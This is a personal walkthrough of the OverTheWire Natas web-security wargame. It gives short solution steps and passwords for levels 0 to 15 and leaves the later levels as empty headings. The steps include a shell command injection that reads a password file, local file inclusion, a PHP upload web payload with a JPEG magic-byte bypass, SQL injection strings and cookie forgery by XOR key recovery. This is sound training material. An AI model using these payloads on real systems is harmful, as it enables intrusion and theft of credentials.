# [The Natas wargame](https://overthewire.org/wargames/natas/)
url: [Natas](http://natas0.natas.labs.overthewire.org)  
Username: natas0  
Password: natas0

### Level 0 → Level 1
Check in the comments  
**password:**  
gtVrDuiDfck831PqWsLEZy5gyDz1clto

### Level 1 → Level 2
F12...  
**password:**  
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

### Level 2 → Level 3
Add /files to url  
**password:**  
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

### Level 3 → Level 4
See /robots.txt file  
-> /s3cr3t  
**password:**  
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

### Level 4 → Level 5
Reffer from natas5  
**password:**  
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

### Level 5 → Level 6
Change loggedin cookie to 1  
**password:**  
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

### Level 6 → Level 7
Add /includes/secret.inc to url  
-> Insert FOEIUWGHFEEUHOFUOIU in textbox  
-> 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9  
**password:**  
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

### Level 7 → Level 8
page=/etc/natas_webpass/natas8  
**password:**  
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

### Level 8 → LeveL 9
Using [PHP sandbox](https://sandbox.onlinephpfunctions.com/)  
```php
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))); 
```  
-> oubWYf2kBq  
-> Insert to textbox  
-> W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl  
**password:**    
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

### Level 9 → Level 10
Insert ';cat /etc/natas_webpass/natas10'  
**password:**  
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

### Level 10 → Level 11
Insert '.* /etc/natas_webpass/natas11 #'  
**password:**  
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

### Level 11 → Level 12
Get the xor encoder key using:
```php
 $text = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
 $encText = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
 
 $outText = '';
 for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $encText[$i % strlen($encText)];
 }
 print $outText;
```
-> key is 'qw8J'
Now get the good cookie:
```php
 function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
 }
 $d = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
 print base64_encode(xor_encrypt(json_encode($d)));
```
-> ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK  
set 'data' cookie to this cookie  
**password:**  
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

### Level 12 → Level 13  
Create php file (a.php for example):
```php
<?php
  echo file_get_contents('/etc/natas_webpass/natas13');
?>
```
change the filename value html tag to 'a.php'
-> <input type="hidden" name="filename" value="a.php">
Upload file and click on the link  
**password:**    
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
  
### Level 13 → Level 14  
Create file start with JPEG magic number('FF D8 FF EE')
```shell
echo -e "\xff\xd8\xff\xe0" > a
```
Create php file('b') similar to level 12:
```php
<?php
  echo file_get_contents('/etc/natas_webpass/natas14');
?>
```
Merge the files
```shell
cat a b > c.php
```
Upload like previous level and click link  
**password:**    
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1  

### Level 14 → Level 15
Simple SQL injection  
Username: natas15  
Password: " OR ""="  
**password:**  
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  
  
### Level 15 → Level 16
Basic Blind SQL injection, 64 char max password, we need to do 2 thing to get the password:  
1. Get the character set (to reduce the complexity of the brute force)
2. Brute force 

Use [this](https://gist.github.com/bom2013/d3a3e83d165209de8164a41c0b74703a) python script to do it  
**password:**    
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh  

### Level 16 → Level 17

**password:**

### Level 17 → Level 18

**password:**

### Level 18 → Level 19

**password:**

### Level 19 → Level 20

**password:**

### Level 20 → Level 21

**password:**

### Level 21 → Level 22

**password:**

### Level 22 → Level 23

**password:**

### Level 23 → Level 24

**password:**

### Level 24 → Level 25

**password:**

### Level 25 → Level 26

**password:**

### Level 26 → Level 27

**password:**

### Level 27 → Level 28

**password:**

### Level 28 → Level 29

**password:**

### Level 29 → Level 30

**password:**

### Level 30 → Level 31

**password:**

### Level 31 → Level 32

**password:**

### Level 32 → Level 33

**password:**

### Level 33 → Level 34

**password:**
